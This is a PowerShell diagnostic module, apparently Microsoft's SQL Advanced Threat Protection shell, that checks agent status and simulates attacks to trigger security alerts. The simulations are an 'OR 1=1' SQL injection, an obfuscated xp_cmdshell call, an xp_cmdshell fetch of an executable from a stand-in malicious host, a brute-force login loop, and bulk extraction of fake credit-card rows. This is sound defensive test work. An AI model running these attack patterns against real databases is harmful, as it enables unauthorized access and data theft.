#Requires -Version 5
Function LogInfo([string]$message)
{
    Write-Host ("[Info    ] $message" -Replace "`n\s*","`n           ")
}

Function LogOk([string]$message)
{
    Write-Host ("[Ok      ] $message" -Replace "`n\s*","`n           ") -ForegroundColor Green
}

Function LogWarning([string]$warningMsg)
{
    Write-Host ("[Warning ] $warningMsg" -Replace "`n\s*","`n           ") -ForegroundColor Yellow
}

Function LogError([string]$errorMsg)
{
    Write-Host ("[Error   ] $errorMsg" -Replace "`n\s*","`n           ") -ForegroundColor Red
}

Function Get-SqlInstances([bool]$isRunningOnly)
{
    if ($isRunningOnly)
    {
        $runningCondition =  "AND State = 'Running'"
    }
    else
    {
        $runningCondition =  ""
    }

    $sqlInstances = Get-CimInstance -Query "SELECT Name, DisplayName, StartName, ProcessId, SystemName, PathName FROM Win32_Service WHERE (Name = 'MSSQLSERVER' OR Name LIKE 'MSSQL$%') AND DisplayName LIKE 'SQL Server (%' $($runningCondition)"
    return $sqlInstances | Select-Object -Property Name, DisplayName ,ProcessId, @{l="Version"; e={ForEach-Object {if ($_.PathName -match "MSSQL(\d\d)\..*\\MSSQL") { [int]$Matches[1]}}}}, @{l="InstanceName"; e={ForEach-Object{ $splitted = $_.Name -Split "\$"; if ($splitted.Count -eq 1) { if($splitted[0] -match "MSSQLSERVER") {$null} else {$splitted[0]} } else { "$($Env:COMPUTERNAME)\$($splitted[1])" }}}}
}

Function Test-Key([string]$path, [string]$key)
{
    if (!(Test-Path $path)) { return $false }
    if ($null -eq (Get-ItemProperty $path).$key) { return $false }
    return $true
}

Function Test-OMSAgentInstalled
{
    LogInfo "Checking if OMS Agent is installed..."
    if ((Test-Key "HKLM:\SOFTWARE\Microsoft\System Center Operations Manager\12\Setup\Agent" "InstallDirectory"))
    {
        $agentVersion = ((Get-Item $Env:ProgramFiles"\Microsoft Monitoring Agent\Agent\HealthService.exe").VersionInfo)
        if ($agentVersion.FileVersion -lt $minimumAgentVersion)
        {
            LogWarning "OMS Agent version is: $($agentVersion.FileVersion). Minimum recommended version is $($minimumAgentVersion)"
            return
        }

        LogOk "OMS Agent is installed."
    }
    else
    {
        LogError "OMS Agent is not installed on the machine."
    }
}

Function Test-OmsAgentRunning
{
    $healthService = Get-Service -Name "HealthService"
    if($healthService.Status -ne "Running")
    {
        LogError "OMS agent (HealthService) is not running (Status: $($healthService.Status)).
        Start the service with the powershell command: Start-Service -Name 'healthservice'"
    }

    LogOk "OMS agent (HealthService) status: $($healthService.Status)"
}

Function Test-SqlRestartMessageExist($instanceName)
{
    LogInfo "Checking for restart message for instance '$instanceName'."
    $restartInstanceLog = Get-WinEvent -LogName 'Operations Manager' | Where-Object { $_.TimeCreated -ge $timeWindowToCheckLogs } | Where-Object { $_.LevelDisplayName -eq "Error" } | Where-Object { $_.EventID -eq 4502 } | Where-Object { $_.Message.Contains($instanceName) }
    if ($null -ne $restartInstanceLog -and  $restartInstanceLog.Length -ne 0)
    {
        # Test if there was a restart of the instance since the restart request
        $lastRestartLogEvent = $restartInstanceLog | Sort-Object -Property TimeGenerated -Descending | Select-Object -First 1
        if((Test-SqlServerReadyForClientConnections $instanceName $lastRestartLogEvent.TimeGenerated) -eq $false)
        {
            LogError "Restart request message for instance '$instanceName' exists.
            Restart the service with the powershell command: Restart-Service -Name '$instanceName'"
            $lastRestartLogEvent
            return $false
        }
    }

    LogOk "Server instance $instanceName - No restart needed."
    return $true
}

Function Test-SqlServerReadyForClientConnections($instanceName, $timeToStartSearch)
{
    LogInfo "Checking for SQL Server restart since $timeToStartSearch" # message for instance '$instanceName'."
    $readyForConnectionLog = Get-WinEvent -LogName 'Application' | Where-Object { $_.TimeCreated -ge $timeToStartSearch } | Where-Object { $_.ProviderName -eq $instanceName } | Where-Object { $_.EventID -eq 17126 } | Where-Object { $_.Message.Contains('SQL Server is now ready for client connections') }
    if ($readyForConnectionLog.Length -eq 0)
    {
        return $false
    }

    $lastRestart = $readyForConnectionLog | Sort-Object -Property TimeGenerated -Descending | Select-Object -First 1
    LogInfo "Server instance '$instanceName' was restarted at $($lastRestart.TimeGenerated)"
    return $true
}

Function Test-OmsAgentRestartedLately
{
    LogInfo "Checking if OMS agent is initialized since $($timeWindowToCheckLogs)."
    $restartInstanceLog = Get-WinEvent -LogName 'Operations Manager' | Where-Object { $_.LevelDisplayName -eq "Information" } | Where-Object { $_.TimeCreated -ge $timeWindowToCheckLogs } | Where-Object { $_.EventID -eq 10113 } | Where-Object { $_.Message.Contains('Taking a New Global Snapshot.') }
    if ($restartInstanceLog.Length -ne 0)
    {
        $logEntry = $restartInstanceLog | Sort-Object -Property TimeGenerated | Select-Object -First 1
        LogInfo "OMS agent was last initialized at $($logEntry[0].TimeGenerated)."
        return
    }
    
    LogOk "OMS agent initialization ok."
}

Function LogErrorLoginWithSolutionInstallRequest($serverInstanceName, $displayName, $solutionName)
{
    LogError "Did not find a successfull login/run for $displayName from SQL ATP.
    Make sure this machine is connected to a workspace which contains the solution '$solutionName'
    To add the solution to the workspace add 'Sql Advanced Data Security' from the marketplace
    If this machine is newlly created, newly connected to a workspace or '$solutionName' solution was recently added to the workspace:
    Please wait 30 minutes and run the script again."
}

Function Test-SqlAdvancedThreatProtectionLoginSuccess($serverInstanceName, $displayName, $isValidateByAppName)
{
    $appName = "SQL Advanced Threat Protection"
    if ($isValidateByAppName)
    {
        $appNameCheck = ".*^application_name:$($appName)$"
        $serverPrincipalCheck = ""
    }
    else
    {
        $appNameCheck = ""
        $serverPrincipalCheck = "^server_principal_name:NT AUTHORITY\\SYSTEM$.*"
    }

    $solutionName = "SQLAdvancedThreatProtection"
    LogInfo "Checking logs for successfull '$appName' login for InstanceName: $displayName"
    $logEntries = Get-WinEvent -LogName 'Security' | Where-Object { $_.TimeCreated -ge $timeWindowToCheckLogs } | Where-Object { $_.EventID -eq 33205 }`
     | Where-Object { $_.Source -match 'MSSQL' }`
     | Where-Object { $_.EntryType -eq [System.Diagnostics.EventLogEntryType]::SuccessAudit }`
     | Where-Object { $_.Message -match "(?smi)$($serverPrincipalCheck)^server_instance_name:$($serverInstanceName.Replace('\', '\\'))$" + $appNameCheck }`
     | Sort-Object -Property TimeGenerated -Descending
    if($logEntries.Length -eq 0)
    {
        LogErrorLoginWithSolutionInstallRequest $serverInstanceName $displayName $solutionName
        return $false
    }

    $lastLoginTime = $logEntries | Select-Object -First 1
    LogOk "$appName successfully logged in to $displayName at $($lastLoginTime.TimeGenerated)"
    return $true
}

Function Test-SqlAdvancedDataSecuritySolutionsOk($instanceName, $isValidateByAppName)
{
    $serverInstanceName = $instanceName
    $displayName = $instanceName
    if ([string]::IsNullOrWhiteSpace($instanceName))
    {
        $serverInstanceName = $Env:COMPUTERNAME
        $displayName = "MSSQLSERVER (default)"
    }

    LogInfo "Checking logs for 'SQL Advanced Data Security' status for InstanceName: $displayName"
    $sqlAtpOk = Test-SqlAdvancedThreatProtectionLoginSuccess $serverInstanceName $displayName $isValidateByAppName
    
    return $sqlAtpOk
}

Function Test-SqlInstancesThreatDetectionStatus
{
    $sqlInstances = Get-SqlInstances $true
    $res = $true
    foreach ($sqlInstance in $sqlInstances)
    {
        LogInfo "Testing Sql Server - Service Name: $($sqlInstance.Name), Display Name: $($sqlInstance.DisplayName), Instance Name: $($sqlInstance.InstanceName), Version: $($sqlInstance.Version)"
        if ($sqlInstance.Version -ge 15)
        {
            LogOk "SQL Server ($($sqlInstance.Version)) does not require restart for SQL ATP"
            continue
        }

        $res = (Test-SqlRestartMessageExist $sqlInstance.Name) -and $res
        $isByAppName = $sqlInstance.Version -eq 14
        $res = (Test-SqlAdvancedDataSecuritySolutionsOk $sqlInstance.InstanceName $isByAppName) -and $res
    }

    return $res
}

Function Get-SqlAtpManagementPackVersion
{
    <#
    .SYNOPSIS
    Gets the management pack version available on the machine.
    #>

    $managementPacksPath = Get-MonitoringAgentManagementPacksPath
    if (-not $managementPacksPath){
        return
    }
    $sqlQueryProtectionMPFile = Get-ChildItem $managementPacksPath | Where-Object {$_.Name -match 'Microsoft.IntelligencePacks.SqlQueryProtection'}
    $sqlQueryProtectionMPXmlContent = [xml](Get-Content $sqlQueryProtectionMPFile.FullName -Encoding Unicode)
    $sqlQueryProtectionMPXmlContent.ManagementPack.Manifest.Identity.Version
}

Function Get-MonitoringAgentManagementPacksPath
{
    <#
    .SYNOPSIS
    Gets the Microsoft Monitoring Agent Management packs Folder Path.
    #>
    $healthServiceStatePath = Split-Path (Split-Path $PSScriptRoot -Parent) -Parent
    if ((Split-Path $healthServiceStatePath -Leaf) -ne 'Health Service State'){
        LogError "Module SqlAdvancedThreatProtectionShell.psm1 needs to be imported from its home directory."
        return $false
    }
    return $healthServiceStatePath + "\Management Packs"
}

Function Get-SqlAtpMonitoringAgentAndWorkspaceId
{
    <#
    .SYNOPSIS
    Gets the Microsoft Monitoring Agent workspace and agent IDs.
    #>
    $monitoringAgentComObject = New-Object -ComObject 'AgentConfigManager.mgmtsvccfg'
    $cloudWorkspaces = $monitoringAgentComObject.GetCloudWorkspaces()
    
    if ($cloudWorkspaces -eq $null)
    {
        LogError "To run this command, please use elevated prompt."
        return;
    }

    $workspaceIdPSObjectProperties = ($cloudWorkspaces | Select-Object -Property workspaceId).PSObject.Properties
    $agentIdPSObjectProperties = ($cloudWorkspaces | Select-Object -Property AgentId).PSObject.Properties

    LogInfo "$($workspaceIdPSObjectProperties.Name): $($workspaceIdPSObjectProperties.Value)"
    LogInfo "$($agentIdPSObjectProperties.Name): $($agentIdPSObjectProperties.Value)"
}

Function Get-SqlAtpServerInstancesVersions
{
    <#
    .SYNOPSIS
    Gets the Microsoft Sql Server instances versions that are installed on the machine.
    #>

    $installedInstances = Get-SqlInstances $false
    foreach ($sqlInstance in $installedInstances)
    {
        LogInfo "Instance: $($sqlInstance.Name), $($sqlInstance.Version)"
    }
}

Function Start-SqlAtpEtwTracing
{
    <#
    .SYNOPSIS
    Starts ETW tracing on the machine.
    #>
    $EtwTracing =  & 'logman' -ets | Where-Object { $_ -match 'TracingGuidsManaged' }
    if ($null -ne $EtwTracing){
        & 'logman' update trace TracingGuidsManaged -ets -p '{36cd7b6e-631a-42e1-a3c0-d436ac41bc61}' 0 0x4 | Out-Null
    }
    else {
        $AgentPath = Split-Path (Split-Path (Split-Path $PSScriptRoot -Parent) -Parent) -Parent
        & $AgentPath"\Tools\StartTracing.cmd" INF | Out-Null
    }
    LogOk "Logs have started collecting at: %WINDIR%\Logs\OpsMgrTrace\TracingGuidsManaged.etl"
}

Function Stop-SqlAtpEtwTracing
{
    <#
    .SYNOPSIS
    Stops ETW tracing on the machine.
    #>
    $AgentPath = Split-Path (Split-Path (Split-Path $PSScriptRoot -Parent) -Parent) -Parent
    & $AgentPath"\Tools\StopTracing.cmd" | Out-Null

    $EtwTracing =  & 'logman' -ets | Where-Object { $_ -match 'TracingGuidsManaged' }
    if ($null -eq $EtwTracing){
        LogOk "Traces have stopped collecting." -ForegroundColor
    }
    else {
        LogError "Traces have not been stopped, try rerunning the command."
    }
}

Function Test-SqlAtpInjection(
    [Parameter(Mandatory=$false)]
    [string]$InstanceName,
    [Parameter(Mandatory=$false)]
    [string]$Port,
    [Parameter(Mandatory=$true)]
    [string]$UserName,
    [Parameter(Mandatory=$true)]
    [securestring]$Password )
{
    <#
    .SYNOPSIS
    Simulates an SQL injection.
    .Parameter InstanceName
    Provide the non default instance to connect to.
    .Parameter Port 
    Provide a non default port to connect to.
    #>

    $server = $env:COMPUTERNAME

    if (![String]::IsNullOrEmpty($InstanceName))
    {
        $server += "\$InstanceName"
    }

    if (![String]::IsNullOrEmpty($Port))
    {
        $server += ",$Port"
    }
    $remark = New-Guid
    $connectionString = "Server = $server;application name=SqliTestApp";
    $Password.MakeReadOnly();
    $sqlCredential = New-Object System.Data.SqlClient.SqlCredential $UserName, $Password;
    try
    {
        $sqlConnection = New-Object System.Data.SqlClient.SqlConnection $connectionString;
        $sqlConnection.Credential = $sqlCredential;
        $sqlCommand = New-Object System.Data.SqlClient.SqlCommand "SELECT * FROM sys.databases WHERE database_id like '1' OR 1=1 -- $($remark)'", $sqlConnection;
        $sqlConnection.Open();
        $sqlCommand.ExecuteReader() | Out-Null;
    }
    finally
    {
        $sqlConnection.Dispose();
    }

    try
    {
        $sqlConnection = New-Object System.Data.SqlClient.SqlConnection $connectionString;
        $sqlConnection.Credential = $sqlCredential;
        $sqlCommand = New-Object System.Data.SqlClient.SqlCommand "select * from sys.databases where database_id like 'l%' --$($remark)123", $sqlConnection;
        $sqlConnection.Open();
        $sqlCommand.ExecuteReader() | Out-Null;
    }
    finally
    {
        $sqlConnection.Dispose();
    }

    try
    {
        $sqlConnection = New-Object System.Data.SqlClient.SqlConnection $connectionString;
        $sqlConnection.Credential = $sqlCredential;
        $sqlCommand = New-Object System.Data.SqlClient.SqlCommand "select * from sys.databases where database_id like ''' --$($remark)123", $sqlConnection;
        $sqlConnection.Open();
        $sqlCommand.ExecuteReader()  | Out-Null;
    }
    catch 
    {
        if ($_.Exception.InnerException.Number -eq 105)
        {
            LogOk "Successfully tested sql injection on $server"
        }
        else
        {
            LogError "Failed to test sql injection. Error $($_.Exception.InnerException.Number)"
        }
    }
    finally
    {
        $sqlConnection.Dispose();
    }

}

Function Test-SqlAtpShellObfuscation(
    [Parameter(Mandatory=$false)]
    [string]$InstanceName,
    [Parameter(Mandatory=$false)]
    [string]$Port,
    [Parameter(Mandatory=$true)]
    [string]$UserName,
    [Parameter(Mandatory=$true)]
    [securestring]$Password )
{
    <#
    .SYNOPSIS
    Simulates a shell command (xp_cmdshell) obfuscation.
    .Parameter InstanceName
    Provide the non default instance to connect to.
    .Parameter Port 
    Provide a non default port to connect to.
    #>

    $server = $env:COMPUTERNAME

    if (![String]::IsNullOrEmpty($InstanceName))
    {
        $server += "\$InstanceName"
    }

    if (![String]::IsNullOrEmpty($Port))
    {
        $server += ",$Port"
    }

    $remark = New-Guid
    $connectionString = "Server = $server;application name=ShellObfuscationTestApp";
    $Password.MakeReadOnly();
    try
    {
        $sqlConnection = New-Object System.Data.SqlClient.SqlConnection $connectionString;
        $sqlCredential = New-Object System.Data.SqlClient.SqlCredential $UserName, $Password;
        $sqlConnection.Credential = $sqlCredential;
        $sqlCommand = New-Object System.Data.SqlClient.SqlCommand "DECLARE @cmd as varchar(3000);SET @cmd = 'x'+'p'+'_'+'c'+'m'+'d'+'s'+'h'+'e'+'l'+'l'+' ' + 'd'+'i'+'r';exec(@cmd); -- $($remark)", $sqlConnection;
        $sqlConnection.Open();
        $sqlCommand.ExecuteReader() | Out-Null;
        LogOk "Successfully simulated shell obfuscation on $server"
    }
    catch 
    {
        if ($_.Exception.InnerException.Number -eq 15281)
        {
            LogOk "Successfully simulated shell obfuscation on $server that was disabled on the server"
        }
        else
        {
            LogError "Failed to simulate shell obfuscation. Error $($_.Exception.InnerException.Number)"
        }
    }
    finally
    {
        $sqlConnection.Dispose();
    }
}

Function Test-SqlAtpShellExternalSourceAnomaly(
    [Parameter(Mandatory=$false)]
    [string]$InstanceName,
    [Parameter(Mandatory=$false)]
    [string]$Port,
    [Parameter(Mandatory=$true)]
    [string]$UserName,
    [Parameter(Mandatory=$true)]
    [securestring]$Password )
{
    <#
    .SYNOPSIS
    Simulates a shell external source anomaly by trying to reach an external source using a shell command.
    .Parameter InstanceName
    Provide the non default instance to connect to.
    .Parameter Port 
    Provide a non default port to connect to.
    #>

    $server = $env:COMPUTERNAME

    if (![String]::IsNullOrEmpty($InstanceName))
    {
        $server += "\$InstanceName"
    }

    if (![String]::IsNullOrEmpty($Port))
    {
        $server += ",$Port"
    }

    $remark = New-Guid
    $connectionString = "Server = $server;application name=ShellExternalSourceTestApp";
    $Password.MakeReadOnly();
    try
    {
        $sqlConnection = New-Object System.Data.SqlClient.SqlConnection $connectionString;
        $sqlCredential = New-Object System.Data.SqlClient.SqlCredential $UserName, $Password;
        $sqlConnection.Credential = $sqlCredential;
        $sqlCommand = New-Object System.Data.SqlClient.SqlCommand "EXEC xp_cmdshell 'hTtP://malicious.external.$($remark).source:443/executable.exe'", $sqlConnection;
        $sqlConnection.Open();
        $sqlCommand.ExecuteReader() | Out-Null;
        LogOk "Successfully simulated shell external source anomaly on $server"
    }
    catch 
    {
        if ($_.Exception.InnerException.Number -eq 15281)
        {
            LogOk "Successfully simulated shell external source anomaly on $server that was disabled on the server"
        }
        else
        {
            LogError "Failed to simulate shell external source. Error $($_.Exception.InnerException.Number)"
        }
    }
    finally
    {
        $sqlConnection.Dispose();
    }
}

Function Test-SqlAtpBruteForce(
    [Parameter(Mandatory=$false)]
    [string]$InstanceName,
    [Parameter(Mandatory=$false)]
    [string]$Port,
    [Parameter(Mandatory=$false)]
    [string]$UserName,
    [Parameter(Mandatory=$false)]
    [int]$AttemptCount=100,
    [Parameter(Mandatory=$false)]
    [securestring]$Password)
{
    <#
    .SYNOPSIS
    Simulates a brute-force attack. 
    .Parameter InstanceName
    Provide the non default instance to connect to.
    .Parameter Port 
    Provide a non default port to connect to.
    .Parameter UserName
    Supply a username to iterate different passwords. If not supplied, iterate different users.
    .Parameter Password
    Supply a password to finish with a successful breach.
    #>

      $server = $env:COMPUTERNAME

      if (![String]::IsNullOrEmpty($InstanceName))
      {
          $server += "\$InstanceName"
      }

      if (![String]::IsNullOrEmpty($Port))
      {
          $server += ",$Port"
      }

      $applicationName = "brute_force_42146f8735244eccab8c6739ec399821"

      if ([String]::IsNullOrEmpty($UserName))
      {
          for ($i = 0; $i -lt $AttemptCount; $i++)
          {
              LogInfo "Failed Login on different users to $server"
              try
              {
                  $SqlConnection = New-Object System.Data.SqlClient.SqlConnection "Server = $server; User ID=user$i; Password=''; Connect Timeout=5; application name=$applicationName"
                  $SqlConnection.Open();
              }
              catch 
              {
                 if ($_.Exception.InnerException.Number -eq 18456)
                 {
                   LogInfo "Login $i failed, retrying.."
                   continue
                 }
                 else
                 {
                   LogError "Failed to test bruteforce. Error $($_.Exception.InnerException.Number)"
                   return
                 }
              }
          }
      }
      else
      {
          LogInfo "attempting to brute-force on password to $server"
          for ($i = 0; $i -lt $AttemptCount; $i++)
          {
            LogInfo "Failed Login on different passwords: Attempt $i"
            try
            {
                $SqlConnection = New-Object System.Data.SqlClient.SqlConnection "Server = $server; User ID=$UserName; Password=$i; Connect Timeout=5; application name=$applicationName"
                $SqlConnection.Open();
            }
            catch 
            {
                if ($_.Exception.InnerException.Number -eq 18456)
                {
                    LogInfo "Login failed, retrying.."
                    continue
                }
                else
                {
                    LogError "Failed to test bruteforce. Error $($_.Exception.InnerException.Number)"
                    return
                }
            }
          }
          if ($Password -ne $null)
          {
              LogInfo "Login attempt on correct password to $server"
              $Password.MakeReadOnly();
              try
              {
                  $SqlConnection = New-Object System.Data.SqlClient.SqlConnection "Server = $server; Connect Timeout=5; application name=$applicationName"
                  $sqlCredential = New-Object System.Data.SqlClient.SqlCredential $UserName, $Password;
                  $sqlConnection.Credential = $sqlCredential;
                  $SqlConnection.Open();
                  LogInfo "Login attempt on correct password succeeded"
              }
              catch 
              {
                  LogError "Failed to test succesful bruteforce. Error $($_.Exception.InnerException.Number)"
                  return
              }
          }
      }

      LogOk "Successfully tested brute force on $server"
}

Function Test-SqlAtpLoginSuspiciousApp(
    [Parameter(Mandatory=$false)]
    [string]$InstanceName,
    [Parameter(Mandatory=$false)]
    [string]$Port,
    [Parameter(Mandatory=$true)]
    [string]$UserName,
    [Parameter(Mandatory=$false)]
    [securestring]$Password )
{
    <#
    .SYNOPSIS
    Simulates a Login by a suspicious application.
    .Parameter InstanceName
    Provide the non default instance to connect to.
    .Parameter Port
    Provide a non default port to connect to.
    .Parameter UserName
    Provide the principal name to use in the connection.
    .Parameter Password
    Provide the password of the principal to use in the connection.
    #>

    $server = $env:COMPUTERNAME

    if (![String]::IsNullOrEmpty($InstanceName))
    {
        $server += "\$InstanceName"
    }

    if (![String]::IsNullOrEmpty($Port))
    {
        $server += ",$Port"
    }

    $remark = New-Guid

    $applicationName = 'NetSparker'

    if ($Password -ne $null)
    {
        $Password.MakeReadOnly();
        $connectionString = "Server = $server;application name=$applicationName";
        $sqlCredential = New-Object System.Data.SqlClient.SqlCredential $UserName, $Password;
        $sqlConnection = New-Object System.Data.SqlClient.SqlConnection $connectionString;
        $sqlConnection.Credential = $sqlCredential;
    }
    else
    {
        $connectionString = "Server = $server;User ID=$UserName;Password='';Connect Timeout=5;application name=$applicationName"
        $sqlConnection = New-Object System.Data.SqlClient.SqlConnection $connectionString;
    }

    try
    {
        $sqlConnection.Open();
        LogOk "Successfully simulated login from a suspicious app on $server"
    }
    catch 
    {
        if ($_.Exception.InnerException.Number -eq 18456)
        {
            LogOk "Successfully simulated login from a suspicious app on $server."
        }
        else
        {
            LogError "Failed to simulate login from a suspicious app. Error $($_.Exception.InnerException.Number)"
        }
    }
    finally
    {
        $sqlConnection.Dispose();
    }
}

Function Test-DataExfiltration(
    [Parameter(Mandatory=$false)]
    [string]$InstanceName,
    [Parameter(Mandatory=$false)]
    [string]$Port,
    [Parameter(Mandatory=$false)]
    [string]$UserName,
    [Parameter(Mandatory=$false)]
    [securestring]$Password)
{
    <#
    .SYNOPSIS
    Simulates an anomalous data exfiltration.
    .Parameter InstanceName
    Provide the non default instance to connect to.
    .Parameter Port 
    Provide a non default port to connect to.
    .Parameter UserName
    Supply a username to use for logging in using SQL Server authentication. If not supplied, use Windows authentication.
    .Parameter Password
    Supply a password to use for logging in using SQL Server authentication. If not supplied, use Windows authentication.
    #>

      $server = $env:COMPUTERNAME

      if (![String]::IsNullOrEmpty($InstanceName))
      {
          $server += "\$InstanceName"
      }

      if (![String]::IsNullOrEmpty($Port))
      {
          $server += ",$Port"
      }

      try
      {
          $connectionString = "Server = $server; application name=data_exfiltration_59d9007ba9b54ade9f60ba8af55355ea;";
          $sqlConnection = New-Object System.Data.SqlClient.SqlConnection $connectionString;

          if (![String]::IsNullOrEmpty($UserName) -and ![String]::IsNullOrEmpty($Password))
          {
              $sqlCredential = New-Object System.Data.SqlClient.SqlCredential $UserName, $Password;
              $sqlConnection.Credential = $sqlCredential;
              LogInfo "Trying to log in using SQL credentials, with user name: $UserName.";
          }
          else
          {
              $connectionString += " Integrated Security = true;"
              $sqlConnection = New-Object System.Data.SqlClient.SqlConnection $connectionString;
              LogInfo "Trying to log in using Windows authentication.";
          }

          $SqlConnection.Open();

          LogInfo "Initializing temporary table for test, this may take a few minutes...";
      
          $sqlCommand = New-Object System.Data.SqlClient.SqlCommand "CREATE TABLE #Information
          (
              name VARCHAR(50),
              credit_card VARCHAR (50)
          
          )", $sqlConnection;
          $sqlCommand.ExecuteNonQuery() | Out-Null;
      
          $tempGuid = New-Guid;
      
          for($i=1; $i -le 1500; $i++)
          {
              $sqlCommand = New-Object System.Data.SqlClient.SqlCommand "INSERT INTO #Information (name, credit_card)
              VALUES ('James Jones the $i th', '$i --$tempGuid')", $sqlConnection;
              $sqlCommand.ExecuteNonQuery() | Out-Null;
              Start-Sleep -Milliseconds 1;
          }

          LogInfo "Extracting data...";
      
          for($i=1; $i -le 600; $i++)
          {
              $sqlCommand = New-Object System.Data.SqlClient.SqlCommand "SELECT TOP $i * FROM #Information --$tempGuid", $sqlConnection;
              $sqlCommand.ExecuteNonQuery() | Out-Null;
          }
      
          $sqlCommand = New-Object System.Data.SqlClient.SqlCommand "SELECT * FROM #Information --$tempGuid", $sqlConnection;
          $sqlCommand.ExecuteNonQuery() | Out-Null;
      }
      catch 
      {
          LogError "Failed to test data exfiltration. Error $($_.Exception.InnerException.Number)"
          return
      }
      finally
      {
          $sqlConnection.Dispose();
      }

      LogOk "Successfully tested data exfiltration on $server"
}

Function Test-SqlAtpPrincipalAnomaly(
    [Parameter(Mandatory=$false)]
    [string]$InstanceName,
    [Parameter(Mandatory=$false)]
    [string]$Port,
    [Parameter(Mandatory=$true)]
    [string]$UserName,
    [Parameter(Mandatory=$false)]
    [securestring]$Password )
{
    <#
    .SYNOPSIS
    Simulates a Login by a principal that is considered an anomaly.
    .Parameter InstanceName
    Provide the non default instance to connect to.
    .Parameter Port
    Provide a non default port to connect to.
    .Parameter UserName
    Provide the principal name to use in the connection.
    .Parameter Password
    Provide the password of the principal to use in the connection.
    #>

    $server = $env:COMPUTERNAME

    if (![String]::IsNullOrEmpty($InstanceName))
    {
        $server += "\$InstanceName"
    }

    if (![String]::IsNullOrEmpty($Port))
    {
        $server += ",$Port"
    }

    $applicationName = 'principal_anomaly_59d9007ba9b54ade9f60ba8af55355ea'

    $Password.MakeReadOnly();
    $connectionString = "Server = $server;application name=$applicationName";
    $sqlCredential = New-Object System.Data.SqlClient.SqlCredential $UserName, $Password;
    $sqlConnection = New-Object System.Data.SqlClient.SqlConnection $connectionString;
    $sqlConnection.Credential = $sqlCredential;

    try
    {
        $sqlConnection.Open();
        LogOk "Successfully simulated login on $server from a principal that will be considered an anomaly."
    }
    catch 
    {
        LogError "Failed to simulate a principal anomaly login on $server."
    }
    finally
    {
        $sqlConnection.Dispose();
    }
}

[Flags()]
enum EventLogLevel
{
    None = 0
    Alerts = 1
    Logins = 2
    Queries = 4
}
 
Function Set-SqlAtpEventLogLevel(
        [Parameter(Mandatory)]
        [ValidateNotNullOrEmpty()]
        [EventLogLevel] $Level
)
{
   $item  = New-ItemProperty "HKLM:\SOFTWARE\Microsoft\AzureOperationalInsights\" -Name "SqlQueryProtection_EventLogWriteStatus" -PropertyType "DWord" -Force -Value $Level
   if ($item)
   {
       LogOk "Successfully set event log level"
   }
   else
   {
        LogError "To run this command, please use elevated prompt."
   }
}

Function Test-SqlAtpAgentStatus
{
    <#
    .SYNOPSIS
    Test the status of OMS Agent that it is installed, running and if there was a recent restart.
    #>

    $timeWindowToCheckLogs = ([DateTimeOffset]::UtcNow - [TimeSpan]::FromHours(2)).LocalDateTime
    $minimumAgentVersion = New-Object System.Version("10.20.18011.0")

    Test-OMSAgentInstalled
    Test-OmsAgentRunning
    Test-OmsAgentRestartedLately
}

Function Test-SqlAtpInstancesStatus
{
    <#
    .SYNOPSIS
    Test the ATP status of SQL Instances running on the machine by examining Windows Event Log
    #>

    $timeWindowToCheckLogs = ([DateTimeOffset]::UtcNow - [TimeSpan]::FromHours(2)).LocalDateTime
    $result = Test-SqlInstancesThreatDetectionStatus
    Write-Host
    if($result -eq $false)
    {
        LogError "**************************************************************
                  ****                 Status tests Failed!                 ****
                  ****        See error messages in log traces above        ****
                  **************************************************************"
        return
    }

    LogOk "**************************************************************
           ****               All tests results passed               ****
           **** SQL Advanced Threat Protection installed and running ****
           **************************************************************"
}

# Exported functions
Export-ModuleMember -Function Get-SqlAtpManagementPackVersion
Export-ModuleMember -Function Get-SqlAtpMonitoringAgentAndWorkspaceId
Export-ModuleMember -Function Get-SqlAtpServerInstancesVersions
Export-ModuleMember -Function Start-SqlAtpEtwTracing
Export-ModuleMember -Function Stop-SqlAtpEtwTracing
Export-ModuleMember -Function Test-SqlAtpBruteForce
Export-ModuleMember -Function Test-DataExfiltration
Export-ModuleMember -Function Test-SqlAtpInjection
Export-ModuleMember -Function Test-SqlAtpShellObfuscation
Export-ModuleMember -Function Test-SqlAtpShellExternalSourceAnomaly
Export-ModuleMember -Function Test-SqlAtpLoginSuspiciousApp
Export-ModuleMember -Function Set-SqlAtpEventLogLevel
Export-ModuleMember -Function Test-SqlAtpAgentStatus
Export-ModuleMember -Function Test-SqlAtpInstancesStatus
Export-ModuleMember -Function Test-SqlAtpPrincipalAnomaly

LogInfo "For a list of available commands in the module run: 
Get-Command -Module SqlAdvancedThreatProtectionShell"
# SIG # Begin signature block
# MIInwgYJKoZIhvcNAQcCoIInszCCJ68CAQExDzANBglghkgBZQMEAgEFADB5Bgor
# BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG
# KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCCIElDvNtsdWMgZ
# Ca96sfrvJweY5RW3++xaijbnx+V+iaCCDXYwggX0MIID3KADAgECAhMzAAADTrU8
# esGEb+srAAAAAANOMA0GCSqGSIb3DQEBCwUAMH4xCzAJBgNVBAYTAlVTMRMwEQYD
# VQQIEwpXYXNoaW5ndG9uMRAwDgYDVQQHEwdSZWRtb25kMR4wHAYDVQQKExVNaWNy
# b3NvZnQgQ29ycG9yYXRpb24xKDAmBgNVBAMTH01pY3Jvc29mdCBDb2RlIFNpZ25p
# bmcgUENBIDIwMTEwHhcNMjMwMzE2MTg0MzI5WhcNMjQwMzE0MTg0MzI5WjB0MQsw
# CQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGluZ3RvbjEQMA4GA1UEBxMHUmVkbW9u
# ZDEeMBwGA1UEChMVTWljcm9zb2Z0IENvcnBvcmF0aW9uMR4wHAYDVQQDExVNaWNy
# b3NvZnQgQ29ycG9yYXRpb24wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB
# AQDdCKiNI6IBFWuvJUmf6WdOJqZmIwYs5G7AJD5UbcL6tsC+EBPDbr36pFGo1bsU
# p53nRyFYnncoMg8FK0d8jLlw0lgexDDr7gicf2zOBFWqfv/nSLwzJFNP5W03DF/1
# 1oZ12rSFqGlm+O46cRjTDFBpMRCZZGddZlRBjivby0eI1VgTD1TvAdfBYQe82fhm
# WQkYR/lWmAK+vW/1+bO7jHaxXTNCxLIBW07F8PBjUcwFxxyfbe2mHB4h1L4U0Ofa
# +HX/aREQ7SqYZz59sXM2ySOfvYyIjnqSO80NGBaz5DvzIG88J0+BNhOu2jl6Dfcq
# jYQs1H/PMSQIK6E7lXDXSpXzAgMBAAGjggFzMIIBbzAfBgNVHSUEGDAWBgorBgEE
